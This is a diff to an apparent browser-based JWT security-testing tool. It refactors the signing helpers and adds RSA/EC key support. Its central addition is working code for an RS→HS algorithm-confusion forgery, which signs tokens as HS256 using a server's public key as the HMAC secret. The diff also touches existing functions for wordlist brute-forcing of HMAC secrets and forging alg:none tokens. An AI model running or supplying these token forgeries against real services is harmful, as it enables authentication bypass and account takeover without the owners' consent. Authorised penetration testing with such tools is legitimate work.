@@ -5,8 +5,11 @@
 import { $, $$, toast, copy } from './util.js';
 import { state, save, identityHeaders } from './state.js';
 import { populateSelect } from './identities.js';
+import {
+  algFamily, b64urlDecode, b64urlEncode, b64urlBytes,
+  hmacSig, asymSign, asymVerify,
+} from './jwt-crypto.js';
 
-const HASH = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };
 let bruteAbort = false;
 
 export function initJwt() {
@@ -24,6 +27,9 @@ export function initJwt() {
   // Sign / verify
   $('#jwtSign').addEventListener('click', signCurrent);
   $('#jwtVerify').addEventListener('click', verifyCurrent);
+  $('#jwtRsToHs').addEventListener('click', forgeRsToHs);
+  $('#jwtAlg').addEventListener('change', updateKeyFields);
+  updateKeyFields();
   // Brute-force
   $('#jwtWordlistBtn').addEventListener('click', () => $('#jwtWordlistFile').click());
   $('#jwtWordlistFile').addEventListener('change', loadWordlistFile);
@@ -36,27 +42,6 @@ export function initJwt() {
     if (!t) return toast('No token', true);
     copy('Authorization: Bearer ' + t);
   });
-}
-
-// ---- base64url ---------------------------------------------------------
-
-function b64urlDecode(str) {
-  const pad = str.length % 4 ? '='.repeat(4 - (str.length % 4)) : '';
-  const b64 = str.replace(/-/g, '+').replace(/_/g, '/') + pad;
-  return decodeURIComponent(
-    atob(b64).split('').map((c) => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
-  );
-}
-
-function b64urlEncode(str) {
-  return btoa(unescape(encodeURIComponent(str)))
-    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
-}
-
-function b64urlBytes(bytes) {
-  let s = '';
-  for (const b of bytes) s += String.fromCharCode(b);
-  return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
 // ---- decode ------------------------------------------------------------
@@ -155,23 +140,17 @@ function applyPreset(kind) {
 
 // ---- sign / verify (HMAC) ---------------------------------------------
 
-async function hmacSig(secret, alg, signingInput) {
-  if (!crypto.subtle) throw new Error('Web Crypto unavailable (needs https or localhost)');
-  const enc = new TextEncoder();
-  const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: HASH[alg] }, false, ['sign']);
-  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(signingInput));
-  return b64urlBytes(new Uint8Array(sig));
-}
-
 async function signCurrent() {
   const hp = readHeaderPayload();
   if (!hp) return;
   const alg = $('#jwtAlg').value;
-  const secret = $('#jwtSecret').value;
   hp.header.alg = alg;
   const signingInput = `${b64urlEncode(JSON.stringify(hp.header))}.${b64urlEncode(JSON.stringify(hp.payload))}`;
   try {
-    const sig = await hmacSig(secret, alg, signingInput);
+    const fam = algFamily(alg);
+    const sig = fam === 'HMAC'
+      ? await hmacSig($('#jwtSecret').value, alg, signingInput)
+      : await asymSign(alg, signingInput, $('#jwtKey').value);
     $('#jwtInput').value = `${signingInput}.${sig}`;
     decode();
     setResult('#jwtSignResult', `signed (${alg})`, 'ok');
@@ -186,10 +165,35 @@ async function verifyCurrent() {
   if (parts.length < 3 || !parts[2]) return setResult('#jwtSignResult', 'no signature to verify', 'bad');
   let alg;
   try { alg = JSON.parse(b64urlDecode(parts[0])).alg; } catch { return setResult('#jwtSignResult', 'bad header', 'bad'); }
-  if (!HASH[alg]) return setResult('#jwtSignResult', `alg ${alg} is not HMAC`, 'bad');
+  const fam = algFamily(alg);
+  if (!fam) return setResult('#jwtSignResult', `alg ${alg} is not supported`, 'bad');
   try {
-    const sig = await hmacSig($('#jwtSecret').value, alg, `${parts[0]}.${parts[1]}`);
-    setResult('#jwtSignResult', sig === parts[2] ? '✓ signature valid' : '✗ signature invalid', sig === parts[2] ? 'ok' : 'bad');
+    const signingInput = `${parts[0]}.${parts[1]}`;
+    const ok = fam === 'HMAC'
+      ? (await hmacSig($('#jwtSecret').value, alg, signingInput)) === parts[2]
+      : await asymVerify(alg, signingInput, parts[2], $('#jwtKey').value);
+    setResult('#jwtSignResult', ok ? '✓ signature valid' : '✗ signature invalid', ok ? 'ok' : 'bad');
+  } catch (e) {
+    setResult('#jwtSignResult', e.message, 'bad');
+  }
+}
+
+// RS→HS algorithm-confusion forgery: sign the token as HS256 using the RSA
+// PUBLIC key (PEM text) as the HMAC secret. Servers that pick the verify
+// algorithm from the token header — and feed the public key in as the HMAC
+// secret — will accept this forgery without the private key.
+async function forgeRsToHs() {
+  const hp = readHeaderPayload();
+  if (!hp) return;
+  const pubPem = $('#jwtKey').value;
+  if (!/-----BEGIN/.test(pubPem)) return setResult('#jwtSignResult', 'paste the RSA PUBLIC key (PEM) in the key box first', 'bad');
+  hp.header.alg = 'HS256';
+  const signingInput = `${b64urlEncode(JSON.stringify(hp.header))}.${b64urlEncode(JSON.stringify(hp.payload))}`;
+  try {
+    const sig = await hmacSig(pubPem, 'HS256', signingInput);
+    $('#jwtInput').value = `${signingInput}.${sig}`;
+    decode();
+    setResult('#jwtSignResult', 'forged HS256 using public key as secret — match the server\'s exact key bytes', 'ok');
   } catch (e) {
     setResult('#jwtSignResult', e.message, 'bad');
   }
@@ -211,7 +215,7 @@ async function bruteForce() {
   if (parts.length < 3 || !parts[2]) return setResult('#jwtBruteResult', 'paste a signed HS* token first', 'bad');
   let alg;
   try { alg = JSON.parse(b64urlDecode(parts[0])).alg; } catch { return setResult('#jwtBruteResult', 'bad header', 'bad'); }
-  if (!HASH[alg]) return setResult('#jwtBruteResult', `alg ${alg} is not HMAC — can't brute`, 'bad');
+  if (algFamily(alg) !== 'HMAC') return setResult('#jwtBruteResult', `alg ${alg} is not HMAC — can't brute`, 'bad');
 
   const words = $('#jwtWordlist').value.split('\n').map((w) => w.replace(/\r$/, '')).filter((w) => w.length);
   if (!words.length) return setResult('#jwtBruteResult', 'add a wordlist first', 'bad');
@@ -268,6 +272,14 @@ function forgeNone() {
   decode();
   copy(token);
   toast('alg:none token forged & copied');
+}
+
+// Show the HMAC secret box for HS*, the PEM key box for RS*/ES*.
+function updateKeyFields() {
+  const hmac = algFamily($('#jwtAlg').value) === 'HMAC';
+  $('#jwtSecret').hidden = !hmac;
+  const keyWrap = $('#jwtKeyWrap');
+  if (keyWrap) keyWrap.hidden = hmac;
 }
 
 function setResult(sel, text, cls) {
